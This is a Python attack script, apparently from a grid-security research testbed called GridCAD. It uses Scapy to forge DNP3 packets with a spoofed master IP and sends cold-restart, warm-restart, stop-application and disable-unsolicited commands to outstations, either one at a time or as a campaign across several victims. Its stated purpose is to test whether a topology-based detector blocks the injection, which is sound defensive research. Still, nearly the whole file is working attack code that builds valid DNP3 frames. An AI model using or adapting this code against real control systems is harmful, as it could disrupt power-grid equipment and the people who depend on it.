#!/usr/bin/env python3
"""
GridCAD — IP-Spoofed Master Impersonation Attack Script
Uses Scapy to forge packets with master IP (10.0.0.1) as source,
simulating an attacker who has compromised an outstation and is
attempting to impersonate the master via raw socket injection.

This script is the companion to dnp3_attack.py (lateral movement).
That script uses real source IP.  This script uses FORGED source IP.

Detection expectation:
  dnp3_detector.py Layer 1 (topology validation) should fire:
    src_ip == MASTER_IP → ONOS port check → port != master_port → BLOCK

Usage (must run as root inside Mininet host):
  sudo python3 dnp3_spoof_attack.py --attacker-station 3 --victim-station 15 --fc 13
  sudo python3 dnp3_spoof_attack.py --campaign --victims 15 16 17 18 --fcs 13 14 18 21
"""

import argparse
import logging
import sys
import time
import struct
import json
from datetime import datetime, timezone
from typing import List, Optional

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DNP3_SPOOF")

# ── Scapy import (requires root + scapy installed) ─────────────────────────────
try:
    from scapy.all import (
        IP, TCP, Raw, send, sr1,
        conf as scapy_conf
    )
    scapy_conf.verb = 0   # suppress scapy output
except ImportError:
    logger.error("Scapy not found. Install with: pip3 install scapy")
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════════════════
# DNP3 PACKET BUILDER  (same CRC logic as the working lateral-movement script)
# ══════════════════════════════════════════════════════════════════════════════

def calculate_crc16(data: bytes) -> bytes:
    crc = 0x0000
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0xA001
            else:
                crc >>= 1
    return struct.pack('<H', crc & 0xFFFF)


def build_dnp3_payload(function_code: int, victim_station: int,
                        master_id: int = 1) -> bytes:
    """
    Build a valid DNP3 application-layer payload.
    Identical structure to the working lateral-movement script so victim
    outstations respond the same way.
    """
    # Application layer
    app_control = bytes([0xC0])          # FIR=1 FIN=1 CON=0 UNS=0 SEQ=0
    fc_byte     = bytes([function_code])
    app_payload = b""
    if function_code in [13, 14]:        # restart commands — optional delay param
        app_payload = bytes([0x00])
    app_data = app_control + fc_byte + app_payload

    # Transport layer
    transport = bytes([0xC0])            # FIR=1 FIN=1 SEQ=0
    user_data = transport + app_data

    # Data link layer header
    control = bytes([0xC4])              # DIR=1 PRM=1 FCB=1 FCV=1 FC=4
    dest    = struct.pack('<H', victim_station)
    src     = struct.pack('<H', master_id)
    length  = len(user_data) + 5

    header_data = bytes([length]) + control + dest + src
    header_crc  = calculate_crc16(header_data)
    data_crc    = calculate_crc16(user_data)

    start_bytes = bytes([0x05, 0x64])
    return start_bytes + header_data + header_crc + user_data + data_crc


# ══════════════════════════════════════════════════════════════════════════════
# SPOOFED ATTACKER CLASS
# ══════════════════════════════════════════════════════════════════════════════

class SpoofedMasterAttacker:
    """
    Sends DNP3 admin commands with the master's IP forged as source.

    The physical sender is attacker_station (e.g. h3 = 10.0.0.3).
    The spoofed source IP is always 10.0.0.1 (master).

    GridCAD's topology validator will:
      1. See src_ip == 10.0.0.1
      2. Query ONOS for the actual ingress port of that packet
      3. Compare against master_location = (of:0000000000000001, port 1)
      4. Detect mismatch → TOPOLOGY VIOLATION → block ingress port
    """

    MASTER_IP  = "10.0.0.1"
    MASTER_ID  = 1

    FC_NAMES = {
        13: "Cold Restart",
        14: "Warm Restart",
        18: "Stop Application",
        21: "Disable Unsolicited"
    }

    def __init__(self, attacker_station: int):
        self.attacker_station = attacker_station
        self.attacker_ip      = f"10.0.0.{attacker_station}"
        self.spoofed_src_ip   = self.MASTER_IP   # always forged

        logger.info(f"Spoofed Master Attacker initialised")
        logger.info(f"Physical attacker : h{attacker_station} ({self.attacker_ip})")
        logger.info(f"Spoofed source IP : {self.spoofed_src_ip}  ← forged master")

    # ── Single attack ──────────────────────────────────────────────────────────

    def send_spoofed_attack(self, victim_station: int, function_code: int,
                             count: int = 1, delay: float = 1.0) -> dict:
        """
        Send `count` spoofed DNP3 packets to victim_station with forged master IP.
        Returns a result dict with timestamps for latency logging.
        """
        victim_ip   = f"10.0.0.{victim_station}"
        victim_port = 20000 + victim_station
        fc_name     = self.FC_NAMES.get(function_code, f"FC-{function_code}")

        logger.info("-" * 70)
        logger.info(f"SPOOFED ATTACK: {self.attacker_ip} → {victim_ip} "
                    f"(FC-{function_code} {fc_name})")
        logger.info(f"Spoofed src IP  : {self.spoofed_src_ip}")
        logger.info(f"Victim port     : {victim_port}")
        logger.info("-" * 70)

        payload = build_dnp3_payload(function_code, victim_station, self.MASTER_ID)

        results = []
        for i in range(count):
            t_sent = time.time()

            try:
                # ── Craft spoofed packet ───────────────────────────────────
                pkt = (
                    IP(src=self.spoofed_src_ip, dst=victim_ip) /
                    TCP(
                        sport=20001,
                        dport=victim_port,
                        flags="PA",
                        seq=1000,
                        ack=1,
                        window=1024
                    ) /
                    Raw(load=payload)
                )

                # send() — fire and forget (no response waiting)
                # We use send() not sr1() because:
                #   (a) the topology check blocks at ONOS/switch level
                #   (b) TCP handshake is skipped intentionally (raw injection)
                send(pkt, verbose=False)

                t_sent_done = time.time()
                logger.info(f"  Attempt {i+1}/{count} — packet sent in "
                            f"{round((t_sent_done - t_sent)*1000, 2)} ms")

                results.append({
                    "attempt":         i + 1,
                    "attacker_ip":     self.attacker_ip,
                    "spoofed_src_ip":  self.spoofed_src_ip,
                    "victim_ip":       victim_ip,
                    "victim_station":  victim_station,
                    "function_code":   function_code,
                    "function_name":   fc_name,
                    "t_sent":          t_sent,
                    "sent_ok":         True,
                    "packet_bytes":    len(payload)
                })

            except Exception as e:
                logger.error(f"  Attempt {i+1} failed: {e}")
                results.append({
                    "attempt":        i + 1,
                    "function_code":  function_code,
                    "sent_ok":        False,
                    "error":          str(e)
                })

            if i < count - 1:
                time.sleep(delay)

        sent_ok = sum(1 for r in results if r.get("sent_ok"))
        logger.info(f"  Sent {sent_ok}/{count} packets")
        return {
            "attacker_station":  self.attacker_station,
            "victim_station":    victim_station,
            "function_code":     function_code,
            "function_name":     fc_name,
            "sent_count":        sent_ok,
            "attempts":          results
        }

    # ── Campaign (full evaluation matrix) ─────────────────────────────────────

    def run_campaign(self, victim_stations: List[int],
                     function_codes: List[int],
                     count_per_attack: int = 1,
                     delay_between: float = 1.5,
                     log_file: Optional[str] = None) -> dict:
        """
        Run the full evaluation matrix:
          for each victim in victim_stations:
            for each fc in function_codes:
              send spoofed attack

        Logs timestamps for every attack so you can compute the latency CDF.
        """
        total       = len(victim_stations) * len(function_codes) * count_per_attack
        campaign_id = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        logger.info("=" * 70)
        logger.info(f"SPOOFED MASTER IMPERSONATION CAMPAIGN  [{campaign_id}]")
        logger.info(f"Attacker   : h{self.attacker_station} ({self.attacker_ip})")
        logger.info(f"Spoofed IP : {self.spoofed_src_ip}")
        logger.info(f"Victims    : {victim_stations}")
        logger.info(f"FCs        : {function_codes}")
        logger.info(f"Total pkts : {total}")
        logger.info("=" * 70)

        campaign_results = {
            "campaign_id":      campaign_id,
            "attacker_station": self.attacker_station,
            "attacker_ip":      self.attacker_ip,
            "spoofed_src_ip":   self.spoofed_src_ip,
            "victim_stations":  victim_stations,
            "function_codes":   function_codes,
            "total_attacks":    total,
            "attacks":          [],
            "summary": {
                "total_sent": 0,
                "total_failed": 0
            }
        }

        attack_num = 1
        for victim in victim_stations:
            for fc in function_codes:
                logger.info(f"\n[{attack_num}/{len(victim_stations)*len(function_codes)}] "
                            f"h{self.attacker_station}→h{victim}  FC-{fc}")

                result = self.send_spoofed_attack(
                    victim_station=victim,
                    function_code=fc,
                    count=count_per_attack,
                    delay=0.5
                )

                campaign_results["attacks"].append(result)
                campaign_results["summary"]["total_sent"]   += result["sent_count"]
                campaign_results["summary"]["total_failed"] += (
                    count_per_attack - result["sent_count"]
                )

                attack_num += 1
                time.sleep(delay_between)

        # ── Print summary ──────────────────────────────────────────────────
        s = campaign_results["summary"]
        logger.info("\n" + "=" * 70)
        logger.info("CAMPAIGN COMPLETE")
        logger.info(f"Total sent   : {s['total_sent']}/{total}")
        logger.info(f"Total failed : {s['total_failed']}")
        logger.info("=" * 70)

        # ── Save log file ──────────────────────────────────────────────────
        if log_file:
            try:
                with open(log_file, 'w') as f:
                    json.dump(campaign_results, f, indent=2)
                logger.info(f"Campaign log saved → {log_file}")
            except Exception as e:
                logger.error(f"Failed to save log: {e}")

        return campaign_results


# ══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="GridCAD — IP-Spoofed Master Impersonation Attack (Scapy)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Single attack:
    sudo python3 dnp3_spoof_attack.py --attacker-station 3 --victim-station 15 --fc 13

  All four FCs against one victim:
    sudo python3 dnp3_spoof_attack.py --attacker-station 3 --victim-station 15 \\
        --fcs 13 14 18 21

  Full evaluation campaign (7 attackers x 4 victims x 4 FCs = 112 attacks):
    sudo python3 dnp3_spoof_attack.py --campaign \\
        --attacker-station 3 \\
        --victims 15 16 17 18 \\
        --fcs 13 14 18 21 \\
        --log campaign_h3.json

  Run from Mininet CLI:
    mininet> h3 sudo python3 dnp3_spoof_attack.py --attacker-station 3 \\
        --campaign --victims 15 16 17 18 --fcs 13 14 18 21
        """
    )

    parser.add_argument("--attacker-station", type=int, required=True,
                        help="Station ID of the physical attacker host (2-24)")

    # Single-attack mode
    parser.add_argument("--victim-station", type=int,
                        help="Single victim station ID (2-24)")
    parser.add_argument("--fc", type=int, default=13,
                        choices=[13, 14, 18, 21],
                        help="Single function code to send")
    parser.add_argument("--count", type=int, default=1,
                        help="Packets per attack (default 1)")

    # Campaign mode
    parser.add_argument("--campaign", action="store_true",
                        help="Run full campaign across multiple victims and FCs")
    parser.add_argument("--victims", type=int, nargs="+",
                        default=[15, 16, 17, 18],
                        help="Victim station IDs for campaign (default: 15 16 17 18)")
    parser.add_argument("--fcs", type=int, nargs="+",
                        default=[13, 14, 18, 21],
                        choices=[13, 14, 18, 21],
                        help="Function codes for campaign (default: 13 14 18 21)")
    parser.add_argument("--delay", type=float, default=1.5,
                        help="Delay between attacks in seconds (default 1.5)")
    parser.add_argument("--log", type=str, default=None,
                        help="Path to save campaign JSON log")

    parser.add_argument("--debug", action="store_true")

    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    # Validate attacker station
    if not (2 <= args.attacker_station <= 24):
        logger.error("--attacker-station must be 2-24")
        sys.exit(1)

    attacker = SpoofedMasterAttacker(args.attacker_station)

    if args.campaign:
        # Campaign mode
        for v in args.victims:
            if not (2 <= v <= 24):
                logger.error(f"Invalid victim station: {v} (must be 2-24)")
                sys.exit(1)

        attacker.run_campaign(
            victim_stations=args.victims,
            function_codes=args.fcs,
            count_per_attack=args.count,
            delay_between=args.delay,
            log_file=args.log
        )

    else:
        # Single attack mode
        if not args.victim_station:
            logger.error("Specify --victim-station for single attack, "
                         "or use --campaign for full matrix")
            sys.exit(1)

        if not (2 <= args.victim_station <= 24):
            logger.error("--victim-station must be 2-24")
            sys.exit(1)

        attacker.send_spoofed_attack(
            victim_station=args.victim_station,
            function_code=args.fc,
            count=args.count,
            delay=args.delay
        )


if __name__ == "__main__":
    main()